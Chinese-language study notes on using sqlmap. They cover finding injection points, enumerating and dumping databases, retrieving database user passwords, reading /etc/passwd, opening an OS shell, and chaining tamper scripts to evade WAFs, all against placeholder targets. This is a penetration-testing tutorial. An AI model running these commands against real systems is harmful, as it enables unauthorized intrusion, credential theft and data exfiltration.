# SQLMAP使用

![image-20260818174558928](image-20260818174558928.png)

## 基础语法
- 语法：
1. ==检测目标并确认注入点==
`sqlmap -u <"http://192.168.1.100/sqli/index.php?id=1"> --batch`
- ==`--batch`==：自动选择默认选项，无需交互式确认。

1. ==列出所有数据库 (Databases)==
`sqlmap -u <"http://192.168.1.100/sqli/index.php?id=1"> --dbs`

2. ==列出指定数据库中的数据表 (Tables)==
使用 ==`-D`== 参数指定目标数据库（假设目标库为 `security`）:
`sqlmap -u <"http://192.168.1.100/sqli/index.php?id=1"> -D <databasesName> --tables`

4. ==列出指定数据表中的字段 (Columns)==
使用 `-T` 参数指定目标数据表（假设目标表为 `users`）：
`sqlmap -u <"http://192.168.1.100/sqli/index.php?id=1"> -D <databasesName> -T <tableName> --columns`

5. ==导出数据 (Dump)==
使用 `-C` 指定关键字段并导出数据：
`sqlmap -u <"http://192.168.1.100/sqli/index.php?id=1"> -D <databasesName> -T <tableName> -C <column1>,<column2>,... --dump`

补：导出数据库中的所有数据
`sqlmap -u <"http://192.168.1.100/sqli/index.php?id=1"> -D <databasesName> -T <tableName> --dump-all`


## 进阶语法

补：查看数据库所有用户
``sqlmap -u <"http://target.com/xxx.php?id=1"> --users``

补：查看数据库当前用户
``sqlmap -u <"http://target.com/xxx.php?id=1"> --current-user``

补：获取数据库密码相关信息
``sqlmap -u <"http://target.com/xxx.php?id=1"> --passwords``

补：判断当前用户是否为超级管理员权限
``sqlmap -u <"http://target.com/xxx.php?id=1"> --is-dba``

补：获取具备数据库用户所拥有的权限
``sqlmap -u <"http://target.com/xxx.php?id=1"> --roles``

补：获取当前 Web 应用连接的数据库名称
``sqlmap -u <"http://target.com/xxx.php?id=1"> --current-db``

补：使用可交互sql-shell执行SQL命令
``sqlmap -u <"http://target.com/xxx.php?id=1"> --sql-shell``




1. POST 请求注入与 HTTP 数据包加载
对于登录框、搜索框等 POST 请求，可采用：
`sqlmap -u <"http://target.com/login.php"> --data=<"username=admin&password=123"> -p username`

2. Cookie 与请求头配置
当目标系统需要登录态或校验特定 Header 时：
```
# 携带 Cookie
sqlmap -u <"http://target.com/user.php?id=1"> --cookie=<"PHPSESSID=abcd1234efgh">

# 随机切换 User-Agent 绕过基础检测
sqlmap -u <"http://target.com/user.php?id=1"> --random-agent

# 自定义 Header（如 Token、X-Forwarded-For）
sqlmap -u <"http://target.com/api"> --headers=<"Authorization: Bearer token123">
```

3. 提升检测强度与风险等级
- `--level`（1-5）：检测的范围。等级越高，测试的 Payload 越多（3 及以上会检测 HTTP Cookie / User-Agent 注入点）。
  
- `--risk`（1-3）：测试的风险度。风险 2 会加入基于时间的盲注，风险 3 会加入基于 `OR` 的注入（可能影响现有数据）

```
sqlmap -u <"http://target.com/vuln.php?id=1"> --level=<num> --risk=<num>
```

4. 系统级控制与文件操作
在具备足够数据库权限（如 MySQL `root`、MSSQL `sa`）且满足特定配置（如 `secure_file_priv` 为空）时

```
# 读取远程服务器中的文件
sqlmap -u <"http://target.com/vuln.php?id=1"> --file-read=<"/etc/passwd">

# 获取交互式操作系统 Shell
sqlmap -u <"http://target.com/vuln.php?id=1"> --os-shell
```





### 绕过 WAF / 过滤机制（Tamper 脚本）
Temper脚本是对原有的普通Payload做处理的一系列脚本

使用空格替换为注释符、大写绕过等组合绕过waf(SQLMap 允许通过逗号分隔同时加载多个 Tamper 脚本，执行顺序从左至右链式生效)：
```
sqlmap -u <"http://target.com/vuln.php?id=1"> --tamper=<"space2comment.py,randomcase.py">
```

#### 典型 WAF 绕过组合策略
1. 针对通用云 WAF / ModSecurity（MySQL 环境）
- **防御特征**：拦截常见关键字（`UNION SELECT`）及连续空格

==其典型的原始语句形式通常为：==
```
sqlmap -u <"http://target.com/vuln.php?id=1"> --tamper="space2comment.py,versionedmorekeywords.py,randomcase.py" --random-agent
```

2. 后端代码使用简单正则“剔除关键字”（非递归替换）
- **防御特征**：将 `UNION`、`SELECT`、`AND` 直接替换为空字符串。

==其典型的原始语句形式通常为：==
```
sqlmap -u <"http://target.com/vuln.php?id=1"> --tamper="nonrecursivereplacement.py,space2comment.py"
```


3. 拦截比较运算符（`>`、`<`、`=`）与逻辑词（`AND`、`OR`）
- **防御特征**：基于签名的布尔盲注检测
```
sqlmap -u <"http://target.com/vuln.php?id=1"> --tamper="equaltolike.py,between.py,symboliclogical.py"
```

4. Windows + IIS + ASP.NET + MSSQL 环境
- **防御特征**：WAF 与后端中间件字符集解析不一致、过滤空格与常规单引号
```
sqlmap -u <"http://target.com/vuln.aspx?id=1"> --tamper="charunicodeencode.py,space2mssqlblank.py,equaltolike.py"
```

























































































































































































